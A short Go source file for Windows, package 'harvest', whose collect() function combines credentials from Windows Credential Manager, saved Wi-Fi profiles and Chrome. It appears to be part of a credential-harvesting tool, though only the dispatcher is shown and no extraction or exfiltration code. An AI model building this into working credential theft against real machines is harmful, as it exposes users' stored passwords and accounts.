//go:build windows
// +build windows

package harvest

func collect() []Credential {
	var out []Credential
	out = append(out, collectWinCred()...)
	out = append(out, collectWiFi()...)
	out = append(out, collectChrome()...)
	return out
}
